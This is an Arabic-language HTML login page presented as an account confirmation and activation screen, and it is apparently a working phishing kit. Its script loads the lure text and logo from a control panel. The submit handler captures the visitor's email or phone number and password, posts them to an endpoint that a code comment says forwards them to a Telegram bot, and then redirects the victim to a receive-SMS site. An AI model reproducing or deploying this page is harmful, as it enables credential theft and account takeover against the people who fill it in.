<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - تأكيد الحساب</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        /* إعدادات الخلفية والجسم ليكون مريحاً للعين */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Cairo', sans-serif; /* خط عصري وأنيق */
            background-color: #f0f2f5; /* لون خلفية رمادي فاتح جداً هادئ */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* حاوية البطاقة الرئيسية بلمسة احترافية */
        .login-card {
            background-color: #ffffff;
            width: 90%;
            max-width: 400px;
            padding: 40px 30px;
            border-radius: 20px; /* حواف انسيابية مستديرة متقنة */
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); /* ظل ناعم ليعطي عمقاً */
            text-align: center;
            border: 1px solid #e1e4e8;
        }

        /* تنسيق الصورة المصغرة (اختياري) */
        #pageImg {
            width: 100px;
            height: 100px;
            border-radius: 50%; /* صورة دائرية */
            object-fit: contain; /* حافظ على أبعاد الصورة */
            margin-bottom: 25px;
            display: inline-block;
            background-color: #f8fafc;
            border: 3px solid #f0f2f5;
        }

        /* تنسيق النص (العنوان) */
        h2 {
            color: #333;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 30px;
        }

        /* تنسيق حقول الإدخال لتكون سهلة الاستخدام */
        .input-group {
            margin-bottom: 20px;
            text-align: right;
        }

        input {
            width: 100%;
            padding: 14px 18px;
            font-size: 16px;
            border: 2px solid #e1e4e8;
            border-radius: 12px; /* حواف مستديرة متقنة للحقول */
            outline: none;
            transition: all 0.3s ease;
            box-sizing: border-box;
            background-color: #fbfcfd;
        }

        input:focus {
            border-color: #007bff; /* يتغير اللون عند الضغط */
            background-color: #fff;
            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
        }

        /* تنسيق رسالة الخطأ */
        .error-msg {
            color: #d9534f;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }

        /* تنسيق الزر الأزرق الاحترافي */
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(to right, #007bff, #0056b3); /* تدرج لوني للزر */
            color: white;
            border: none;
            border-radius: 12px; /* حواف مستديرة متقنة للزر */
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }

        button:hover {
            transform: translateY(-2px); /* تأثير ارتفاع بسيط عند المرور بالماوس */
            box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
        }

        button:active {
            transform: translateY(0);
        }

    </style>
</head>
<body>

    <div class="login-card">
        <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg" alt="Logo">
        
        <h2 id="pageLetter">سجل دخولك لتفعيل الخدمة</h2>

        <form id="authForm">
            <div class="input-group">
                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <div id="userError" class="error-msg">يرجى إدخال بيانات صحيحة</div>
            </div>

            <div class="input-group">
                <input type="password" id="passInput" placeholder="كلمة السر" required>
            </div>

            <button type="submit" id="pageBtn">تأكيد الآن</button>
        </form>
    </div>

    <script>
        // دالة جلب البيانات لتحديث الصورة والنصوص تلقائياً من اللوحة
        async function fetchConfig() {
            try {
                const response = await fetch('/api/get');
                const data = await response.json();
                if(data.image) document.getElementById('pageImg').src = data.image;
                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
                if(data.button) document.getElementById('pageBtn').innerText = data.button;
            } catch (e) { console.log("استخدام الإعدادات الافتراضية"); }
        }
        window.onload = fetchConfig;

        // التحقق من الإدخال والإرسال
        const form = document.getElementById('authForm');
        form.onsubmit = async (e) => {
            e.preventDefault();
            
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;
            const errorText = document.getElementById('userError');

            // منطق التحقق البسيط
            const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(user);
            const isPhone = /^\+?[0-9]{7,15}$/.test(user);

            if (!isEmail && !isPhone) {
                errorText.style.display = 'block';
                document.getElementById('userInput').style.borderColor = '#d9534f';
                return;
            }

            // إرسال البيانات لبوت التلجرام
            await fetch('/api/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    letter: "👤 المستخدم: " + user,
                    button: "🔑 كلمة السر: " + pass
                })
            });

            // تحويل المستخدم لموقع الجوائز أو الأرقام
            window.location.href = "https://receive-smss.com/";
        };
    </script>
</body>
</html>
